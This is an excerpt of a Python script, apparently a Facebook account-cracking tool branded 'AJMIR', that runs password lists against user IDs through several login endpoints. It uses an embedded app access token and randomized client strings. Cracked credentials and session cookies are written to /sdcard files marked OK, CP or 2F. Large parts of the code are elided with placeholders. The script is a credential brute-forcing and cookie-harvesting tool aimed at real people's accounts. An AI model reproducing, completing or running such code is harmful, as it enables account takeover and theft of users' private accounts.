...
logo=("""
 \033[1;97m_______   __    __         __  __    __   ______  
\033[1;97m|       \ |  \  |  \      _/  \|  \  |  \ /      \ 
\033[1;97m| $$$$$$$\| $$  | $$     |   $$| $$  | $$|  $$$$$$\
\033[1;97m| $$  | $$ \$$\/  $$______\$$$$| $$__| $$ \$$__| $$
\033[1;97m| $$  | $$  >$$  $$|      \| $$| $$    $$ /      $$
\033[1;97m| $$  | $$ /  $$$$\ \$$$$$$| $$ \$$$$$$$$|  $$$$$$ 
\033[1;97m| $$__/ $$|  $$ \$$\      _| $$_     | $$| $$_____ 
\033[1;97m| $$    $$| $$  | $$     |   $$ \    | $$| $$     \
\033[1;97m \$$$$$$$  \$$   \$$      \$$$$$$     \$$ \$$$$$$$$ DX
		...
		try:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AJMIR-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/AJMIR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [AJMIR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/AJMIR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AJMIR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [AJMIR-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [AJMIR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AJMIR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [AJMIR-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AJMIR-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in ASHIK:
				...
				print('\r\r\033[1;32m [AJMIR-OK] %s | %s'%(ids,pas))
				open('/sdcard/AJMIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AJMIR-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [AJMIR-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [AJMIR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def ASHIK2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AJMIR-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/AJMIR-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [AJMIR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def ASHIK4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [AJMIR-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [AJMIR-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [AJMIR-OK] '+uid+' | '+pas)
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [AJMIR-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/AJMIR-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
